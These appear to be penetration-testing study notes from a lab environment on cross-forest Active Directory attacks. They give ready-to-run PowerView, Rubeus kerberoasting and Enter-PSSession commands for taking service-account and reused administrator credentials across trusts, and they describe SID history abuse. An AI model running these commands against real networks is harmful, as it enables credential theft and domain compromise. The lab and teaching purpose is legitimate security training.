**I. Cross-Forest Kerberoasting**

**Concept:** Performing Kerberoasting across domain trusts to obtain credentials for accounts in other domains.

**Steps:**

1. **Enumerate SPNs:**
    - Use PowerView:
        
        ```powershell
        Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
        ```
        
2. **Verify account privileges:**
    - Use PowerView:
        
        ```powershell
        Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
        ```
        
3. **Perform Kerberoasting:**
    - Use Rubeus with the `/domain:` flag:
        
        ```powershell
        .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
        ```
        
4. **Crack the hash:**
    - Use Hashcat to crack the obtained hash.

**Key Takeaway:**

- Exploiting trusts to gain access to privileged accounts in other domains.

**II. Admin Password Re-Use & Group Membership**

**Password Re-Use:**

- Checking for password reuse across domains with bidirectional trusts.
- If an attacker gains credentials in one domain, they might work in another.

**Group Membership:**

- Enumerating foreign group memberships to find accounts with cross-domain privileges.

**Commands:**

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

**Verify Access:**

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

**Key Takeaway:**

- Exploiting weak password management and misconfigured group memberships.

**III. SID History Abuse - Cross Forest**

**Concept:**

- Abusing SID history across forest trusts when SID filtering is not enabled.
- Allows accounts to retain privileges from their original domain after migration.

**Mechanism:**

- Adding SIDs from one forest to the `sidHistory` attribute of accounts in another.
- The user retains the rights of the added SID in their token.

**Key Takeaway:**

- Exploiting misconfigurations in trust relationships to maintain or gain privileges.

**IV. Important Considerations:**

- Cross-forest attacks can significantly expand an attacker's reach.
- Enumeration and verification are crucial steps.
- Password reuse is a very common issue.
- SID filtering is very important to have enabled.
